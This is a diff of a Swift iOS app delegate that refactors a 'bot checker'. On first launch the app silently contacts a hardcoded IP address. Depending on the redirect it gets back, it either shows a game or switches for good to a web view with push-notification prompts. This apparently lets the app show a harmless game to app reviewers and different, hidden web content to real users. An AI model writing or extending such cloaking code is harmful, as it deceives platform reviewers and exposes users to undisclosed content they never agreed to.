@@ -8,7 +8,6 @@
 
 import UIKit
 import OneSignal
-import FBSDKCoreKit
 import Reachability
 
 class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserverDelegate {
@@ -19,11 +18,26 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
     }
     
     var window: UIWindow?
-    
     static let shared = DifferentServices()
     fileprivate let defaults = UserDefaults.standard
     fileprivate var state: AppState
-    fileprivate var checkRun = false
+    fileprivate var wasRun = false
+    
+    fileprivate var firstAppBoot: Bool {
+        get {
+            return defaults.object(forKey: "firstAppBoot") as? Bool ?? true
+        } set (newValue) {
+            defaults.set(newValue, forKey: "firstAppBoot")
+        }
+    }
+    
+    fileprivate var appIsGame: Bool {
+        get {
+            return defaults.object(forKey: "appIsGame") as? Bool ?? true
+        } set (newValue) {
+            defaults.set(newValue, forKey: "appIsGame")
+        }
+    }
     
     //MARK: - Reachability
     override init() {
@@ -45,9 +59,9 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
             case .WKWeb:
                 launchWKweb()
             case .starting:
-                if checkFirstBoot() && !checkRun  {
+                if firstAppBoot  {
                     checkMainURL()
-                } else if checkGame() {
+                } else if appIsGame {
                     launchTheGame()
                 } else {
                     launchWKweb()
@@ -59,43 +73,38 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
                 self.launchNoInternet()
             }
         }
-        print(state)
+        print(#line, state)
     }
     
     //MARK: - Bot checker logic
-    fileprivate func checkFirstBoot() -> Bool {
-        return defaults.object(forKey:"firstBoot") as? Bool ?? true
-    }
-    
-    fileprivate func checkGame() -> Bool {
-        return defaults.object(forKey:"game") as? Bool ?? true
-    }
-    
     fileprivate func checkMainURL() {
-        checkRun.toggle()
-        let config = URLSessionConfiguration.default
-        let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
-        let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
-        let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
-        task.resume()
+        if !wasRun {
+            let config = URLSessionConfiguration.default
+            let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
+            let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
+            let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
+            task.resume()
+        }
+        print(#line, #function)
+        wasRun.toggle()
     }
     
     fileprivate func gameOrNot(_ redirectURL: String) {
         print(#file, #function, redirectURL)
         if redirectURL == "https://nobot/" {
-            defaults.set(false, forKey: "firstBoot")
-            defaults.set(false, forKey: "game")
+            firstAppBoot = false
+            appIsGame = false
             state = .WKWeb
             hasPromptedOneSignal()
             DispatchQueue.main.async {
-                self.launchWKweb()
+               self.launchWKweb()
             }
         } else {
-            defaults.set(false, forKey: "firstBoot")
-            defaults.set(true, forKey: "game")
+            firstAppBoot = false
+            appIsGame = true
             state = .inGame
             DispatchQueue.main.async {
-                self.launchTheGame()
+              self.launchTheGame()
             }
         }
     }
@@ -115,26 +124,23 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
     
     //MARK: - UI Launcher
     func screenLauncher() {
-        if checkFirstBoot()  {
+        if firstAppBoot  {
             if reachable {
                 checkMainURL()
             } else {
-                state = .starting
                 launchNoInternet()
             }
         } else {
             if reachable {
-                if checkGame() {
+                if appIsGame {
                     launchTheGame()
                 } else {
                     launchWKweb()
                 }
             } else {
-                state = .starting
                 launchNoInternet()
             }
         }
-        print(#line, state)
     }
 }
 //MARK: - URLSessionDataDelegate
